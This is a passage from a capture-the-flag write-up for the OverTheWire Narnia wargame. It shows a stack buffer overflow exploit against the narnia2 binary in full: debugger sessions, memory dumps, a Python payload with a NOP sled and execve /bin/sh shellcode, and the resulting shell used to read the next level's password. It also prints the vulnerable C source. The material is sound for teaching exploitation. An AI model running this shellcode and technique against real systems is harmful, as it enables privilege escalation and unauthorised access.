Exploitation</span></h3><h4 class="c21" id="h.ifkxhsp30btt"><span class="c16">POC</span></h4><p class="c0"><span class="c2">Before the attack was conducted on the target machine, the payload was first executed on the attacking box so as to get a better view as to how to correctly format the payload using pwndbg. </span></p><a id="t.580bba4da17fdc8896218a4e70f690a720377080"></a><a id="t.20"></a><table class="c24"><tr class="c22"><td class="c18" colspan="1" rowspan="1"><p class="c19"><span class="c3">pwndbg&gt; r $(python -c </span><span class="c11">&quot;print &#39;A&#39;*132 +&#39;B&#39;*4 +&#39;\x90&#39;*30 +&#39;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80&#39;&quot;</span><span class="c3">) &nbsp; &nbsp; &nbsp; &nbsp; <br>Starting program: /home/0xd4y/business/other/overthewire/narnia/2/narnia2 $(python -c </span><span class="c11">&quot;print &#39;A&#39;*132 +&#39;B&#39;*4 +&#39;\x90&#39;*30 +&#39;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e<br>\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80&#39;&quot;</span><span class="c3">) &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br>Program received signal SIGSEGV, Segmentation fault. &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 0x42424242 </span><span class="c6">in</span><span class="c3">&nbsp;?? () &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</span></p></td></tr></table><p class="c0"><span class="c49 c31 c46 c50">Note how the EIP register was successfully overwritten with 4 B&rsquo;s </span></p><p class="c0"><span class="c2">After executing this payload, we can view where in the EBP register lies the payload:</span></p><a id="t.d3aa6747c3126bee37e1245493b10ed82af83752"></a><a id="t.21"></a><table class="c24"><tr class="c22"><td class="c18" colspan="1" rowspan="1"><p class="c19"><span class="c3">pwndbg&gt; x/</span><span class="c8">100</span><span class="c3">x $esp-</span><span class="c8">200</span><span class="c3">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br></span><span class="c8">0</span><span class="c3">xffffcec8: &nbsp; &nbsp; </span><span class="c8">0</span><span class="c3">xffffdf8b &nbsp; &nbsp; &nbsp;</span><span class="c8">0x00000000</span><span class="c3">&nbsp; &nbsp; &nbsp; </span><span class="c8">0</span><span class="c3">xf7fa6000 &nbsp; &nbsp; &nbsp;</span><span class="c8">0</span><span class="c3">xf7fa6000 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br></span><span class="c8">0</span><span class="c3">xffffced8: &nbsp; &nbsp; </span><span class="c8">0</span><span class="c3">xffffcf88 &nbsp; &nbsp; &nbsp;</span><span class="c8">0</span><span class="c3">xf7e14fe5 &nbsp; &nbsp; &nbsp;</span><span class="c8">0</span><span class="c3">xf7fa6d20 &nbsp; &nbsp; &nbsp;</span><span class="c8">0x08048534</span><span class="c3">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</span><span class="c8">0</span><span class="c3">xffffcee8: &nbsp; &nbsp; </span><span class="c8">0</span><span class="c3">xffffcf04 &nbsp; &nbsp; &nbsp;</span><span class="c8">0x00000000</span><span class="c3">&nbsp; &nbsp; &nbsp; </span><span class="c8">0</span><span class="c3">xffffcf08 &nbsp; &nbsp; &nbsp;</span><span class="c8">0</span><span class="c3">xf7ffd980 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br></span><span class="c8">0</span><span class="c3">xffffcef8: &nbsp; &nbsp; </span><span class="c8">0</span><span class="c3">xf7e14fc5 &nbsp; &nbsp; &nbsp;</span><span class="c8">0x08048494</span><span class="c3">&nbsp; &nbsp; &nbsp; </span><span class="c8">0x08048534</span><span class="c3">&nbsp; &nbsp; &nbsp; </span><span class="c8">0</span><span class="c3">xffffcf08 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="c8">0</span><span class="c3">xffffcf08: &nbsp; &nbsp; </span><span class="c8">0x41414141</span><span class="c3">&nbsp; &nbsp; &nbsp; </span><span class="c8">0x41414141</span><span class="c3">&nbsp; &nbsp; &nbsp; </span><span class="c8">0x41414141</span><span class="c3">&nbsp; &nbsp; &nbsp; </span><span class="c8">0x41414141</span><span class="c3">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br></span><span class="c8">0</span><span class="c3">xffffcf18: &nbsp; &nbsp; </span><span class="c8">0x41414141</span><span class="c3">&nbsp; &nbsp; &nbsp; </span><span class="c8">0x41414141</span><span class="c3">&nbsp; &nbsp; &nbsp; </span><span class="c8">0x41414141</span><span class="c3">&nbsp; &nbsp; &nbsp; </span><span class="c8">0x41414141</span><span class="c3">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br></span><span class="c8">0</span><span class="c3">xffffcf28: &nbsp; &nbsp; </span><span class="c8">0x41414141</span><span class="c3">&nbsp; &nbsp; &nbsp; </span><span class="c8">0x41414141</span><span class="c3">&nbsp; &nbsp; &nbsp; </span><span class="c8">0x41414141</span><span class="c3">&nbsp; &nbsp; &nbsp; </span><span class="c8">0x41414141</span><span class="c3"><br></span><span class="c8">0</span><span class="c3">xffffcf38: &nbsp; &nbsp; </span><span class="c8">0x41414141</span><span class="c3">&nbsp; &nbsp; &nbsp; </span><span class="c8">0x41414141</span><span class="c3">&nbsp; &nbsp; &nbsp; </span><span class="c8">0x41414141</span><span class="c3">&nbsp; &nbsp; &nbsp; </span><span class="c8">0x41414141</span><span class="c3"><br></span><span class="c8">0</span><span class="c3">xffffcf48: &nbsp; &nbsp; </span><span class="c8">0x41414141</span><span class="c3">&nbsp; &nbsp; &nbsp; </span><span class="c8">0x41414141</span><span class="c3">&nbsp; &nbsp; &nbsp; </span><span class="c8">0x41414141</span><span class="c3">&nbsp; &nbsp; &nbsp; </span><span class="c8">0x41414141</span><span class="c3">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br></span><span class="c8">0</span><span class="c3">xffffcf58: &nbsp; &nbsp; </span><span class="c8">0x41414141</span><span class="c3">&nbsp; &nbsp; &nbsp; </span><span class="c8">0x41414141</span><span class="c3">&nbsp; &nbsp; &nbsp; </span><span class="c8">0x41414141</span><span class="c3">&nbsp; &nbsp; &nbsp; </span><span class="c8">0x41414141</span><span class="c3"><br></span><span class="c8">0</span><span class="c3">xffffcf68: &nbsp; &nbsp; </span><span class="c8">0x41414141</span><span class="c3">&nbsp; &nbsp; &nbsp; </span><span class="c8">0x41414141</span><span class="c3">&nbsp; &nbsp; &nbsp; </span><span class="c8">0x41414141</span><span class="c3">&nbsp; &nbsp; &nbsp; </span><span class="c8">0x41414141</span><span class="c3"><br></span><span class="c8">0</span><span class="c3">xffffcf78: &nbsp; &nbsp; </span><span class="c8">0x41414141</span><span class="c3">&nbsp; &nbsp; &nbsp; </span><span class="c8">0x41414141</span><span class="c3">&nbsp; &nbsp; &nbsp; </span><span class="c8">0x41414141</span><span class="c3">&nbsp; &nbsp; &nbsp; </span><span class="c8">0x41414141</span><span class="c3"><br></span><span class="c8">0</span><span class="c3">xffffcf88: &nbsp; &nbsp; </span><span class="c8">0x41414141</span><span class="c3">&nbsp; &nbsp; &nbsp; </span><span class="c8">0x42424242</span><span class="c3">&nbsp; &nbsp; &nbsp; </span><span class="c8">0x90909090</span><span class="c3">&nbsp; &nbsp; &nbsp; </span><span class="c8">0x90909090</span><span class="c3"><br></span><span class="c8">0</span><span class="c3">xffffcf98: &nbsp; &nbsp; </span><span class="c8">0x90909090</span><span class="c3">&nbsp; &nbsp; &nbsp; </span><span class="c8">0x90909090</span><span class="c3">&nbsp; &nbsp; &nbsp; </span><span class="c8">0x90909090</span><span class="c3">&nbsp; &nbsp; &nbsp; </span><span class="c8">0x90909090</span><span class="c3"><br></span><span class="c8">0</span><span class="c3">xffffcfa8: &nbsp; &nbsp; </span><span class="c8">0x90909090</span><span class="c3">&nbsp; &nbsp; &nbsp; </span><span class="c8">0</span><span class="c3">xc</span><span class="c8">0319090</span><span class="c3">&nbsp; &nbsp; &nbsp; </span><span class="c8">0</span><span class="c3">x</span><span class="c8">2f2f6850</span><span class="c3">&nbsp; &nbsp; &nbsp; </span><span class="c8">0</span><span class="c3">x</span><span class="c8">2f686873</span><span class="c3"><br></span><span class="c8">0</span><span class="c3">xffffcfb8: &nbsp; &nbsp; </span><span class="c8">0</span><span class="c3">x</span><span class="c8">896e6962</span><span class="c3">&nbsp; &nbsp; &nbsp; </span><span class="c8">0</span><span class="c3">x</span><span class="c8">895350e3</span><span class="c3">&nbsp; &nbsp; &nbsp; </span><span class="c8">0</span><span class="c3">xcd0bb0e1 &nbsp; &nbsp; &nbsp;</span><span class="c8">0x00000080</span><span class="c3"><br></span><span class="c8">0</span><span class="c3">xffffcfc8: &nbsp; &nbsp; </span><span class="c8">0</span><span class="c3">xf7fa6000 &nbsp; &nbsp; &nbsp;</span><span class="c8">0</span><span class="c3">xf7fa6000 &nbsp; &nbsp; &nbsp;</span><span class="c8">0x00000000</span><span class="c3">&nbsp; &nbsp; &nbsp; </span><span class="c8">0</span><span class="c3">x6675dc09</span></p></td></tr></table><p class="c28"><span class="c2"></span></p><p class="c0"><span>As we can see, the junk bytes lead all the way to </span><span class="c8">0</span><span class="c3">xffffcf88</span><span>, and the return address starts at </span><span class="c8">0</span><span class="c3">xffffcf88</span><span>&nbsp;+ 4 which is </span><span class="c8">0</span><span class="c3">xffffcf8c</span><span>. The NOP sled then begins at </span><span class="c8">0</span><span class="c3">xffffcf90</span><span>, and the shellcode starts at </span><span class="c8">0</span><span class="c3">xffffcfac</span><span class="c2">. Using this information, we can construct the payload to be the following:</span></p><p class="c0"><span class="c49 c36">python -c &quot;print </span><span class="c27 c36">&#39;A&#39;</span><span class="c49 c36">*132 +</span><span class="c27 c36">&#39;\x98\xcf\xff\xff&#39; </span><span class="c49 c36">+ </span><span class="c27 c36">&#39;\x90&#39;</span><span class="c49 c36">*30 + </span><span class="c27 c36">&#39;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80&#39;</span><span class="c49 c36">&quot;</span></p><p class="c28"><span class="c2"></span></p><p class="c0"><span>The return address points to </span><span class="c27">0xffffcf98</span><span>&nbsp;which is an address within the boundary of the NOP sled. Therefore, this payload should go past each NOP bytes as it eventually gets to the shellcode. </span></p><a id="t.54ac3ed7d8a9c99ce9e96e03f8f99eb009f643a9"></a><a id="t.22"></a><table class="c24"><tr class="c22"><td class="c18" colspan="1" rowspan="1"><p class="c19"><span class="c3">pwndbg&gt; r $(python -c </span><span class="c11">&quot;print &#39;A&#39;*132 +&#39;\x98\xcf\xff\xff&#39;+&#39;\x90&#39;*30 +&#39;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80&#39;&quot;</span><span class="c3">) &nbsp; &nbsp; &nbsp; &nbsp; <br>Starting program: /home/0xd4y/business/other/overthewire/narnia/2/narnia2 $(python -c </span><span class="c11">&quot;print &#39;A&#39;*132 +&#39;\x98\xcf\xff\xff&#39;+&#39;\x90&#39;*30 +&#39;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80&#39;&quot;</span><span class="c3">)<br>process 5966 is executing new program: /usr/bin/dash<br>$ whoami<br>[Attaching after process 5966 fork to child process 5974]<br>[New inferior 2 (process 5974)]<br>[Detaching after fork from parent process 5966]<br>[Inferior 1 (process 5966) detached]<br>process 5974 is executing new program: /usr/bin/whoami<br>0xd4y</span></p></td></tr></table><p class="c28"><span class="c2"></span></p><p class="c0"><span class="c2">Seeing as the program successfully executed the shellcode, we can now try this same payload ( with the modification of the return address) on the target machine.</span></p><h4 class="c21" id="h.btcg0ydv7z1y"><span class="c16">Exploiting the Binary on the Target</span></h4><p class="c0"><span class="c2">After logging into the narnia2 user and running the same payload within gdb we see the following:</span></p><a id="t.5ea09657e203c9fd68cbead9efdcdb5c212efba1"></a><a id="t.23"></a><table class="c24"><tr class="c22"><td class="c18" colspan="1" rowspan="1"><p class="c19"><span class="c3">narnia2@narnia:/narnia$ gdb ./narnia2 -q &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; [37/634]<br>Reading symbols from ./narnia2...(no debugging symbols found)...</span><span class="c6">done</span><span class="c3">.<br>(gdb) r $(python -c </span><span class="c11">&quot;print &#39;A&#39;*132 +&#39;\x98\xcf\xff\xff&#39;+&#39;\x90&#39;*30 +&#39;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80&#39;&quot;</span><span class="c3">) &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br>Starting program: /narnia/narnia2 $(python -c </span><span class="c11">&quot;print &#39;A&#39;*132 +&#39;\x98\xcf\xff\xff&#39;+&#39;\x90&#39;*30 +&#39;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0<br>\x0b\xcd\x80&#39;&quot;</span><span class="c3">)<br><br>Program received signal SIGSEGV, Segmentation fault.<br>0xffffcf98 </span><span class="c6">in</span><span class="c3">&nbsp;?? ()<br>(gdb) x/100x </span><span class="c12">$esp</span><span class="c3">-200<br>0xffffd448: &nbsp; &nbsp; 0xf7e53f7b &nbsp; &nbsp; &nbsp;0x00000000 &nbsp; &nbsp; &nbsp;0x00000002 &nbsp; &nbsp; &nbsp;0xf7fc5000<br>0xffffd458: &nbsp; &nbsp; 0xffffd508 &nbsp; &nbsp; &nbsp;0xf7e5b7f6 &nbsp; &nbsp; &nbsp;0xf7fc5d60 &nbsp; &nbsp; &nbsp;0x08048534<br>0xffffd468: &nbsp; &nbsp; 0xffffd488 &nbsp; &nbsp; &nbsp;0xf7e5b7d0 &nbsp; &nbsp; &nbsp;0xffffd488 &nbsp; &nbsp; &nbsp;0xf7ffd920<br>0xffffd478: &nbsp; &nbsp; 0xf7e5b7d5 &nbsp; &nbsp; &nbsp;0x08048494 &nbsp; &nbsp; &nbsp;0x08048534 &nbsp; &nbsp; &nbsp;0xffffd488<br>0xffffd488: &nbsp; &nbsp; 0x41414141 &nbsp; &nbsp; &nbsp;0x41414141 &nbsp; &nbsp; &nbsp;0x41414141 &nbsp; &nbsp; &nbsp;0x41414141<br>0xffffd498: &nbsp; &nbsp; 0x41414141 &nbsp; &nbsp; &nbsp;0x41414141 &nbsp; &nbsp; &nbsp;0x41414141 &nbsp; &nbsp; &nbsp;0x41414141<br>0xffffd4a8: &nbsp; &nbsp; 0x41414141 &nbsp; &nbsp; &nbsp;0x41414141 &nbsp; &nbsp; &nbsp;0x41414141 &nbsp; &nbsp; &nbsp;0x41414141<br>0xffffd4b8: &nbsp; &nbsp; 0x41414141 &nbsp; &nbsp; &nbsp;0x41414141 &nbsp; &nbsp; &nbsp;0x41414141 &nbsp; &nbsp; &nbsp;0x41414141<br>0xffffd4c8: &nbsp; &nbsp; 0x41414141 &nbsp; &nbsp; &nbsp;0x41414141 &nbsp; &nbsp; &nbsp;0x41414141 &nbsp; &nbsp; &nbsp;0x41414141<br>0xffffd4d8: &nbsp; &nbsp; 0x41414141 &nbsp; &nbsp; &nbsp;0x41414141 &nbsp; &nbsp; &nbsp;0x41414141 &nbsp; &nbsp; &nbsp;0x41414141<br>0xffffd4e8: &nbsp; &nbsp; 0x41414141 &nbsp; &nbsp; &nbsp;0x41414141 &nbsp; &nbsp; &nbsp;0x41414141 &nbsp; &nbsp; &nbsp;0x41414141<br>0xffffd4f8: &nbsp; &nbsp; 0x41414141 &nbsp; &nbsp; &nbsp;0x41414141 &nbsp; &nbsp; &nbsp;0x41414141 &nbsp; &nbsp; &nbsp;0x41414141<br>0xffffd508: &nbsp; &nbsp; 0x41414141 &nbsp; &nbsp; &nbsp;0xffffcf98 &nbsp; &nbsp; &nbsp;0x90909090 &nbsp; &nbsp; &nbsp;0x90909090<br>0xffffd518: &nbsp; &nbsp; 0x90909090 &nbsp; &nbsp; &nbsp;0x90909090 &nbsp; &nbsp; &nbsp;0x90909090 &nbsp; &nbsp; &nbsp;0x90909090<br>0xffffd528: &nbsp; &nbsp; 0x90909090 &nbsp; &nbsp; &nbsp;0xc0319090 &nbsp; &nbsp; &nbsp;0x2f2f6850 &nbsp; &nbsp; &nbsp;0x2f686873<br>0xffffd538: &nbsp; &nbsp; 0x896e6962 &nbsp; &nbsp; &nbsp;0x895350e3 &nbsp; &nbsp; &nbsp;0xcd0bb0e1 &nbsp; &nbsp; &nbsp;0xfe790080<br>0xffffd548: &nbsp; &nbsp; 0xc497b545 &nbsp; &nbsp; &nbsp;0x00000000 &nbsp; &nbsp; &nbsp;0x00000000 &nbsp; &nbsp; &nbsp;0x00000000</span></p></td></tr></table><p class="c28"><span class="c2"></span></p><p class="c0"><span>Here we can see that the junk bytes end at </span><span class="c3">0xffffd508</span><span>&nbsp;and the EIP register is overwritten at </span><span class="c3">0xffffd50C</span><span>. The nop sled then begins at </span><span class="c3">0xffffd510</span><span>&nbsp;and the shellcode starts at </span><span class="c3">0xffffd52c</span><span>. Therefore, we can modify the payload to point to </span><span class="c3">0xffffd518</span><span class="c2">&nbsp;which is within the bounds of the NOP sled and the shellcode will get executed.</span></p><a id="t.2043152d71524ec95d742a3832232df3bcb004b2"></a><a id="t.24"></a><table class="c24"><tr class="c22"><td class="c18" colspan="1" rowspan="1"><p class="c19"><span class="c3">narnia2@narnia:/narnia$ ./narnia2 $(python -c </span><span class="c11">&quot;print &#39;A&#39;*132 +&#39;\x18\xd5\xff\xff&#39;+&#39;\x90&#39;*30 +&#39;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0<br>\x0b\xcd\x80&#39;&quot;</span><span class="c3">)<br>Illegal instruction</span></p></td></tr></table><p class="c28"><span class="c2"></span></p><p class="c0"><span>Unfortunately, this payload did not work most likely due to a small shift in the memory address. It is important to note the fact that &ldquo;Illegal instruction&rdquo; was outputted instead of &ldquo;Segmentation fault&rdquo; which is a strong indicator that the payload is close to successful execution</span><span>. It is the result of the overwritten EIP register pointing to an address with meaningless assembly code. After tweaking the address a little bit (changing </span><span class="c11">\x18\xd5\xff\xff</span><span>&nbsp;to </span><span class="c11">\x48\xd5\xff\xff</span><span class="c2">, we get a shell as narnia3:</span></p><a id="t.45c03453f1a8f05bb6a7a336cb6ee7778b77af10"></a><a id="t.25"></a><table class="c24"><tr class="c22"><td class="c18" colspan="1" rowspan="1"><p class="c19"><span class="c3">narnia2@narnia:/narnia$ ./narnia2 $(python -c </span><span class="c11">&quot;print &#39;A&#39;*132 +&#39;\x48\xd5\xff\xff&#39;+&#39;\x90&#39;*30 +&#39;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0<br>\x0b\xcd\x80&#39;&quot;</span><span class="c3 c45">)<br>$ whoami<br>narnia3</span></p><p class="c19"><span class="c3">$ cat /etc/narnia_pass/narnia3<br>vaequeezee</span></p></td></tr></table><h3 class="c10" id="h.f5q3c5hy51ko"><span class="c5">Source Code</span></h3><a id="t.8d3d0e666058c41e0403a7b51adf75d4fe58e2f3"></a><a id="t.26"></a><table class="c24"><tr class="c22"><td class="c18" colspan="1" rowspan="1"><p class="c19"><span class="c8">#include &lt;stdio.h&gt;</span><span class="c3"><br></span><span class="c8">#include &lt;string.h&gt;</span><span class="c3"><br></span><span class="c8">#include &lt;stdlib.h&gt;</span><span class="c3"><br><br></span><span class="c6">int</span><span class="c3">&nbsp;</span><span class="c4">main</span><span class="c8">(</span><span class="c6">int</span><span class="c8">&nbsp;argc, </span><span class="c6">char</span><span class="c8">&nbsp;* argv[])</span><span class="c3">{<br> &nbsp; &nbsp;</span><span class="c6">char</span><span class="c3">&nbsp;buf[</span><span class="c8">128</span><span class="c3">];<br><br> &nbsp; &nbsp;</span><span class="c6">if</span><span class="c3">(argc == </span><span class="c8">1</span><span class="c3">){<br> &nbsp; &nbsp; &nbsp; &nbsp;</span><span class="c8">printf</span><span class="c3">(</span><span class="c11">&quot;Usage: %s argument\n&quot;</span><span class="c3">, argv[</span><span class="c8">0</span><span class="c3">]);<br> &nbsp; &nbsp; &nbsp; &nbsp;</span><span class="c8">exit</span><span class="c3">(</span><span class="c8">1</span><span class="c3">);<br> &nbsp; &nbsp;}<br> &nbsp; &nbsp;</span><span class="c8">strcpy</span><span class="c3">(buf,argv[</span><span class="c8">1</span><span class="c3">]);<br> &nbsp; &nbsp;</span><span class="c8">printf</span><span class="c3">(</span><span class="c11">&quot;%s&quot;</span><span class="c3">, buf);<br><br> &nbsp; &nbsp;</span><span class="c6">return</span><span class="c3">&nbsp;</span><span class="c8">0</span><span class="c3">;<br>}</span></p></td></tr></table><p class="c28"><span class="c2"></span></p><p class="c0"><span class="c2">We can see that this program is vulnerable, as it only expects to receive up to 128 bytes for the buffer, and does not properly check the size of the user&rsquo;s input.</span></p><h2 class="c10" id="h.ya2tytmk5a6"><span class="c40 c36">Narnia 3</span></h2><p class="c0"><span class="c2">Executing the narnia3 binary we see the following:</span></p><a id="t.22e43957f310f4d185af0df0904cb12ddbdeb4b7"></a><a id="t.27"></a><table class="c24"><tr class="c22"><td class="c18" colspan="1" rowspan="1"><p class="c19"><span class="c3">narnia3@narnia:/narnia$ ./narnia3<br>usage, ./narnia3 file, will send contents of file 2 /dev/null</span></p></td></tr></table><p class="c23"><span class="c2"></span></p><p class="c0"><span class="c2">Essentially, the program claims that it will read the contents of a file and write its contents to /dev/null. </span></p><h3 class="c10" id="h.9bmlxskadml"><span class="c5">Attempting to Read Passwords from the Stack Pointer</span></h3><p class="c0"><span class="c2">This means that the contents of the file it is reading from will most likely be in the esp register upon reading. We can verify this by first running the program in gdb and setting a breakpoint at the instruction right before the program terminates.</span></p><a id="t.5aea8f54d26b07d97b02d2e861c82b7adee8695b"></a><a id="t.28"></a><table class="c24"><tr class="c22"><td class="c18" colspan="1" rowspan="1"><p class="c19"><span class="c3">&nbsp; &nbsp;0x08048602 &lt;+247&gt;: &nbsp; pushl &nbsp;-0x4(%ebp) &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br> &nbsp; 0x08048605 &lt;+250&gt;: &nbsp; call &nbsp; 0x80483f0 &lt;close@plt&gt; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 